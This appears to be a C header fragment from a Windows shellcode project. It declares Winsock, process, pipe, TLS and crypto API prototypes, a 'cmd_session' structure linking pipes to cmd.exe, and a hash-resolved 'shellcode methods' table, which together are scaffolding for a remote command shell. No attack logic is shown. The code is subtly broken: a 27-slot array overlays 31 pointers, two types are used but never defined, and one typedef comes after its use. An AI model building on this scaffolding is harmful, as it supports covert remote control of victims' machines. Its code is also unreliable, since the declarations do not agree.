/**
  Copyright © 2016 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#define SECURITY_WIN32 // for sspi

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stddef.h>

#include <ws2tcpip.h>
#include <winsock2.h>
#include <windows.h>
#include <winnt.h>
#include <wincrypt.h>
#include <wintrust.h>
#include <schannel.h>
#include <security.h>
#include <sspi.h>
  
//#define DEBUG 1 // only for compiling as executable

#if defined(DEBUG) && DEBUG > 0
 #define DEBUG_PRINT(...) { \
   fprintf(stderr, "\nDEBUG: %s:%d:%s(): ", __FILE__, __LINE__, __FUNCTION__); \
   fprintf(stderr, __VA_ARGS__); \
 }
#else
 #define DEBUG_PRINT(...) // Don't do anything in release builds
#endif

#pragma intrinsic(memcmp, memcpy, memset, memmove)

#define memcpy(x,y,z) __movsb(x,y,z)
#define memmove(x,y,z) __movsb(x,y,z)
#define memset(x,y,z) __stosb(x,y,z)

#pragma comment(lib, "crypt32.Lib")
#pragma comment(lib, "ws2_32.Lib")

#define TLS_MAX_BUFSIZ 32768

#define TLS_CONNECTION_INFO SECPKG_ATTR_CONNECTION_INFO
#define TLS_STREAM_SIZE     SECPKG_ATTR_STREAM_SIZES
  
DWORD MyGetTickCount(VOID);
DWORD MyGetLastError(VOID);
FARPROC MyGetProcAddress(DWORD);

//
//
// structures
//
//
typedef struct tcp_ctx_t {
  char   *address, *port;
  int    s, ai_addrlen;
  HANDLE sck_evt;
  struct sockaddr     *ai_addr;
  struct sockaddr_in  v4;
  struct sockaddr_in6 v6;  
  char                ip[INET6_ADDRSTRLEN];  
} tcp_ctx;

typedef struct tls_ctx_t {
  SECURITY_STATUS           ss;
	HMODULE                   lib;
	PSecurityFunctionTable    sspi;
	HCERTSTORE                cert;
  SecPkgContext_StreamSizes sizes;
} tls_ctx;

typedef struct tls_session_t {
	int                 established, start, sck, secure;
	int                 failed, read_alerts, write_alerts;

	SCHANNEL_CRED       sc;
	CredHandle          cc;
	CtxtHandle          ctx;
  TimeStamp           ts;
  SecBuffer           pExtra;
  
  uint8_t             *buf;
  DWORD               buflen, maxlen;
  char                *address, *port;
  int                 s, ai_addrlen;
  struct sockaddr     *ai_addr;
  struct sockaddr_in  v4;
  struct sockaddr_in6 v6;  
  char                ip[INET6_ADDRSTRLEN];   
} tls_session;

typedef struct cmd_session_t {
  HANDLE              out1;    // CreateNamedPipe
  HANDLE              in0;     // CreatePipe read
  HANDLE              in1;     // CreatePipe write
  HANDLE              out0;    // CreateFile
  HANDLE              evt0;    // WSACreateEvent
  HANDLE              evt1;    // CreateEvent for cmd.exe
  PROCESS_INFORMATION pi;      // 
} cmd_session;


typedef int (WINAPI* WSACleanup_t)(void);

typedef int (WINAPI* shutdown_t)(
    SOCKET s,
    int    how
);

typedef int (WSAAPI* getaddrinfo_t)(
    PCSTR            pNodeName,
    PCSTR            pServiceName,
    const ADDRINFOA  *pHints,
    PADDRINFOA       *ppResult
);

typedef void (WSAAPI* freeaddrinfo_t)(
    struct addrinfo *ai
);

SOCKET WSASocket(
  _In_ int                af,
  _In_ int                type,
  _In_ int                protocol,
  _In_ LPWSAPROTOCOL_INFO lpProtocolInfo,
  _In_ GROUP              g,
  _In_ DWORD              dwFlags
);

int setsockopt(
  _In_       SOCKET s,
  _In_       int    level,
  _In_       int    optname,
  _In_ const char   *optval,
  _In_       int    optlen
);

SOCKET WSAAccept(
  _In_    SOCKET          s,
  _Out_   struct sockaddr *addr,
  _Inout_ LPINT           addrlen,
  _In_    LPCONDITIONPROC lpfnCondition,
  _In_    DWORD_PTR       dwCallbackData
);

int listen(
  _In_ SOCKET s,
  _In_ int    backlog
);

int bind(
  _In_ SOCKET                s,
  _In_ const struct sockaddr *name,
  _In_ int                   namelen
);

SOCKET accept(
  _In_    SOCKET          s,
  _Out_   struct sockaddr *addr,
  _Inout_ int             *addrlen
);

int recvfrom(
  _In_        SOCKET          s,
  _Out_       char            *buf,
  _In_        int             len,
  _In_        int             flags,
  _Out_       struct sockaddr *from,
  _Inout_opt_ int             *fromlen
);

typedef int (WINAPI* WSAStartup_t)(
    WORD      wVersionRequested,
    LPWSADATA lpWSAData
);

typedef SOCKET (WSAAPI* socket_t)(
    int af,
    int type,
    int protocol
);

typedef int (WINAPI* connect_t)(
    SOCKET                s,
    const struct sockaddr *name,
    int                   namelen
);

typedef int (WINAPI* send_t)(
    SOCKET s,
    const char   *buf,
    int    len,
    int    flags
);

typedef int (WINAPI* recv_t)(
    SOCKET s,
    char   *buf,
    int    len,
    int    flags
);

typedef int (WINAPI* ioctlsocket_t)(
    SOCKET s,
    long   cmd,
    u_long *argp
);

typedef int (WINAPI* closesocket_t)(
    SOCKET s
);

typedef WSAEVENT (WINAPI* WSACreateEvent_t)(void);

typedef int (WINAPI* WSAEventSelect_t)(
    SOCKET   s,
    WSAEVENT hEventObject,
    long     lNetworkEvents
);

typedef int (WINAPI* WSAEnumNetworkEvents_t)(
    SOCKET             s,
    WSAEVENT           hEventObject,
    LPWSANETWORKEVENTS lpNetworkEvents
);

typedef HMODULE (WINAPI* LoadLibrary_t)(
    LPCTSTR lpFileName
);

typedef BOOL (WINAPI* CloseHandle_t)( HANDLE hFile);

typedef BOOL (WINAPI* CreateProcess_t)(
    LPCTSTR               lpApplicationName,
    LPTSTR                lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCTSTR               lpCurrentDirectory,
    LPSTARTUPINFO         lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

typedef HANDLE (WINAPI* CreateThread_t)(
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId
);

typedef HANDLE (WINAPI* CreateEvent_t)(
    LPSECURITY_ATTRIBUTES lpEventAttributes,
    BOOL                  bManualReset,
    BOOL                  bInitialState,
    LPCTSTR               lpName
);

typedef BOOL (WINAPI* TerminateProcess_t)(
    HANDLE hProcess,
    UINT   uExitCode
);

typedef DWORD (WINAPI* WaitForMultipleObjects_t)(
    DWORD  nCount,
    const HANDLE *lpHandles,
    BOOL   bWaitAll,
    DWORD  dwMilliseconds
);

typedef BOOL (WINAPI* CreatePipe_t)(
    PHANDLE               hReadPipe,
    PHANDLE               hWritePipe,
    LPSECURITY_ATTRIBUTES lpPipeAttributes,
    DWORD                 nSize
);

typedef HANDLE (WINAPI* CreateNamedPipe_t)(
    LPCTSTR               lpName,
    DWORD                 dwOpenMode,
    DWORD                 dwPipeMode,
    DWORD                 nMaxInstances,
    DWORD                 nOutBufferSize,
    DWORD                 nInBufferSize,
    DWORD                 nDefaultTimeOut,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes
);

typedef HANDLE (WINAPI* CreateFile_t)(
    LPCTSTR               lpFileName,
    DWORD                 dwDesiredAccess,
    DWORD                 dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD                 dwCreationDisposition,
    DWORD                 dwFlagsAndAttributes,
    HANDLE                hTemplateFile
);

typedef BOOL (WINAPI* ReadFile_t)(
    HANDLE       hFile,
    LPVOID       lpBuffer,
    DWORD        nNumberOfBytesToRead,
    LPDWORD      lpNumberOfBytesRead,
    LPOVERLAPPED lpOverlapped
);

typedef BOOL (WINAPI* WriteFile_t)(
    HANDLE       hFile,
    LPCVOID      lpBuffer,
    DWORD        nNumberOfBytesToWrite,
    LPDWORD      lpNumberOfBytesWritten,
    LPOVERLAPPED lpOverlapped
);

typedef BOOL (WINAPI* GetOverlappedResult_t)(
    HANDLE       hFile,
    LPOVERLAPPED lpOverlapped,
    LPDWORD      lpNumberOfBytesTransferred,
    BOOL         bWait
);

typedef HANDLE (WINAPI* GetProcessHeap_t)(void);

typedef LPVOID (WINAPI* HeapAlloc_t)(
    HANDLE hHeap,
    DWORD  dwFlags,
    SIZE_T dwBytes
);

typedef LPVOID (WINAPI* HeapReAlloc_t)(
    HANDLE hHeap,
    DWORD  dwFlags,
    LPVOID lpMem,
    SIZE_T dwBytes
);

typedef BOOL (WINAPI* HeapFree_t)(
    HANDLE hHeap,
    DWORD  dwFlags,
    LPVOID lpMem
);

typedef FARPROC (WINAPI* GetProcAddress_t)(
    HMODULE hModule,
    LPCSTR  lpProcName
);

BOOL WINAPI CryptAcquireContext(
  _Out_ HCRYPTPROV *phProv,
  _In_  LPCTSTR    pszContainer,
  _In_  LPCTSTR    pszProvider,
  _In_  DWORD      dwProvType,
  _In_  DWORD      dwFlags
);

BOOL WINAPI CryptReleaseContext(
  _In_ HCRYPTPROV hProv,
  _In_ DWORD      dwFlags
);

BOOL WINAPI CryptDeriveKey(
  _In_    HCRYPTPROV hProv,
  _In_    ALG_ID     Algid,
  _In_    HCRYPTHASH hBaseData,
  _In_    DWORD      dwFlags,
  _Inout_ HCRYPTKEY  *phKey
);

BOOL WINAPI CryptDestroyKey(
  _In_ HCRYPTKEY hKey
);


BOOL WINAPI CryptExportKey(
  _In_    HCRYPTKEY hKey,
  _In_    HCRYPTKEY hExpKey,
  _In_    DWORD     dwBlobType,
  _In_    DWORD     dwFlags,
  _Out_   BYTE      *pbData,
  _Inout_ DWORD     *pdwDataLen
);

BOOL WINAPI CryptGenKey(
  _In_  HCRYPTPROV hProv,
  _In_  ALG_ID     Algid,
  _In_  DWORD      dwFlags,
  _Out_ HCRYPTKEY  *phKey
);

BOOL WINAPI CryptGenRandom(
  _In_    HCRYPTPROV hProv,
  _In_    DWORD      dwLen,
  _Inout_ BYTE       *pbBuffer
);

BOOL WINAPI CryptGetKeyParam(
  _In_    HCRYPTKEY hKey,
  _In_    DWORD     dwParam,
  _Out_   BYTE      *pbData,
  _Inout_ DWORD     *pdwDataLen,
  _In_    DWORD     dwFlags
);

BOOL WINAPI CryptGetUserKey(
  _In_  HCRYPTPROV hProv,
  _In_  DWORD      dwKeySpec,
  _Out_ HCRYPTKEY  *phUserKey
);

BOOL WINAPI CryptImportKey(
  _In_  HCRYPTPROV hProv,
  _In_  BYTE       *pbData,
  _In_  DWORD      dwDataLen,
  _In_  HCRYPTKEY  hPubKey,
  _In_  DWORD      dwFlags,
  _Out_ HCRYPTKEY  *phKey
);

BOOL WINAPI CryptSetKeyParam(
  _In_       HCRYPTKEY hKey,
  _In_       DWORD     dwParam,
  _In_ const BYTE      *pbData,
  _In_       DWORD     dwFlags
);

BOOL WINAPI CryptDecrypt(
  _In_    HCRYPTKEY  hKey,
  _In_    HCRYPTHASH hHash,
  _In_    BOOL       Final,
  _In_    DWORD      dwFlags,
  _Inout_ BYTE       *pbData,
  _Inout_ DWORD      *pdwDataLen
);

BOOL WINAPI CryptEncrypt(
  _In_    HCRYPTKEY  hKey,
  _In_    HCRYPTHASH hHash,
  _In_    BOOL       Final,
  _In_    DWORD      dwFlags,
  _Inout_ BYTE       *pbData,
  _Inout_ DWORD      *pdwDataLen,
  _In_    DWORD      dwBufLen
);

BOOL WINAPI CryptVerifySignature(
  _In_ HCRYPTHASH hHash,
  _In_ BYTE       *pbSignature,
  _In_ DWORD      dwSigLen,
  _In_ HCRYPTKEY  hPubKey,
  _In_ LPCTSTR    sDescription,
  _In_ DWORD      dwFlags
);

BOOL WINAPI CryptCreateHash(
  _In_  HCRYPTPROV hProv,
  _In_  ALG_ID     Algid,
  _In_  HCRYPTKEY  hKey,
  _In_  DWORD      dwFlags,
  _Out_ HCRYPTHASH *phHash
);

BOOL WINAPI CryptHashData(
  _In_ HCRYPTHASH hHash,
  _In_ BYTE       *pbData,
  _In_ DWORD      dwDataLen,
  _In_ DWORD      dwFlags
);

BOOL WINAPI CryptDestroyHash(
  _In_ HCRYPTHASH hHash
);

BOOL WINAPI CryptSignHash(
  _In_    HCRYPTHASH hHash,
  _In_    DWORD      dwKeySpec,
  _In_    LPCTSTR    sDescription,
  _In_    DWORD      dwFlags,
  _Out_   BYTE       *pbSignature,
  _Inout_ DWORD      *pdwSigLen
);

BOOL WINAPI CryptGetHashParam(
  _In_    HCRYPTHASH hHash,
  _In_    DWORD      dwParam,
  _Out_   BYTE       *pbData,
  _Inout_ DWORD      *pdwDataLen,
  _In_    DWORD      dwFlags
);

BOOL WINAPI CryptDecodeObjectEx(
  _In_          DWORD              dwCertEncodingType,
  _In_          LPCSTR             lpszStructType,
  _In_    const BYTE               *pbEncoded,
  _In_          DWORD              cbEncoded,
  _In_          DWORD              dwFlags,
  _In_          PCRYPT_DECODE_PARA pDecodePara,
  _Out_         void               *pvStructInfo,
  _Inout_       DWORD              *pcbStructInfo
);

BOOL WINAPI CryptDecodeObject(
  _In_          DWORD  dwCertEncodingType,
  _In_          LPCSTR lpszStructType,
  _In_    const BYTE   *pbEncoded,
  _In_          DWORD  cbEncoded,
  _In_          DWORD  dwFlags,
  _Out_         void   *pvStructInfo,
  _Inout_       DWORD  *pcbStructInfo
);

BOOL WINAPI CryptExportPublicKeyInfo(
  _In_    HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hCryptProvOrNCryptKey,
  _In_    DWORD                           dwKeySpec,
  _In_    DWORD                           dwCertEncodingType,
  _Out_   PCERT_PUBLIC_KEY_INFO           pInfo,
  _Inout_ DWORD                           *pcbInfo
);

BOOL WINAPI CryptImportPublicKeyInfo(
  _In_  HCRYPTPROV            hCryptProv,
  _In_  DWORD                 dwCertEncodingType,
  _In_  PCERT_PUBLIC_KEY_INFO pInfo,
  _Out_ HCRYPTKEY             *phKey
);

BOOL WINAPI CryptGetProvParam(
  _In_    HCRYPTPROV hProv,
  _In_    DWORD      dwParam,
  _Out_   BYTE       *pbData,
  _Inout_ DWORD      *pdwDataLen,
  _In_    DWORD      dwFlags
);

BOOL WINAPI CertCloseStore(
  _In_ HCERTSTORE hCertStore,
  _In_ DWORD      dwFlags
);

HCERTSTORE WINAPI CertOpenStore(
  _In_       LPCSTR            lpszStoreProvider,
  _In_       DWORD             dwMsgAndCertEncodingType,
  _In_       HCRYPTPROV_LEGACY hCryptProv,
  _In_       DWORD             dwFlags,
  _In_ const void              *pvPara
);

HANDLE IcmpCreateFile(void);

DWORD IcmpSendEcho(
  _In_     HANDLE                 IcmpHandle,
  _In_     IPAddr                 DestinationAddress,
  _In_     LPVOID                 RequestData,
  _In_     WORD                   RequestSize,
  _In_opt_ PIP_OPTION_INFORMATION RequestOptions,
  _Out_    LPVOID                 ReplyBuffer,
  _In_     DWORD                  ReplySize,
  _In_     DWORD                  Timeout
);

DWORD WINAPI IcmpSendEcho2(
  _In_     HANDLE                 IcmpHandle,
  _In_opt_ HANDLE                 Event,
  _In_opt_ PIO_APC_ROUTINE        ApcRoutine,
  _In_opt_ PVOID                  ApcContext,
  _In_     IPAddr                 DestinationAddress,
  _In_     LPVOID                 RequestData,
  _In_     WORD                   RequestSize,
  _In_opt_ PIP_OPTION_INFORMATION RequestOptions,
  _Out_    LPVOID                 ReplyBuffer,
  _In_     DWORD                  ReplySize,
  _In_     DWORD                  Timeout
);

BOOL IcmpCloseHandle(
  _In_ HANDLE IcmpHandle
);

typedef
VOID WINAPI
(*PIO_APC_ROUTINE) (
    IN PVOID ApcContext,
    IN PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG Reserved
    );
    
    
#define HTONS(x) ((((WORD)(x) & 0xff00) >> 8) | (((WORD)(x) & 0x00ff) << 8))

// shellcode methods
typedef struct _sc_methods_t {
  union {
    LPVOID api[27];
    struct {
      // kernel32
      GetProcAddress_t          pGetProcAddress;
      LoadLibrary_t             pLoadLibraryA;
      GetProcessHeap_t          pGetProcessHeap;
      HeapAlloc_t               pHeapAlloc;
      HeapReAlloc_t             pHeapReAlloc;
      HeapFree_t                pHeapFree;
      CreateNamedPipe_t         pCreateNamedPipe;
      CreatePipe_t              pCreatePipe;
      CreateFile_t              pCreateFile;
      WriteFile_t               pWriteFile;
      ReadFile_t                pReadFile;
      GetOverlappedResult_t     pGetOverlappedResult;
      CreateProcess_t           pCreateProcess;
      TerminateProcess_t        pTerminateProcess;
      CreateEvent_t             pCreateEvent;
      CloseHandle_t             pCloseHandle;
      WaitForMultipleObjects_t  pWaitForMultipleObjects;
      
      // ws2_32
      getaddrinfo_t             pgetaddrinfo;
      freeaddrinfo_t            pfreeaddrinfo;      
      socket_t                  psocket;
      connect_t                 pconnect;
      send_t                    psend;
      recv_t                    precv;
      closesocket_t             pclosesocket;
      ioctlsocket_t             pioctlsocket;
      WSAEventSelect_t          pWSAEventSelect;
      WSAEnumNetworkEvents_t    pWSAEnumNetworkEvents;
      WSACreateEvent_t          pWSACreateEvent;
      WSAStartup_t              pWSAStartup;
      WSAIoctl_t                pWSAIoctl;
      WSASocket_t               pWSASocket;
    };
  };
} m_tbl;

// shellcode properties
typedef struct _sc_properties_t {
  SOCKET              s;
  DWORD               evt_cnt; // number of events to monitor
} p_tbl;

// shellcode class
typedef struct sc_cls_t {
  m_tbl               m;       // methods    (code section)
  p_tbl               p;       // properties (data section)
} sc_cls;



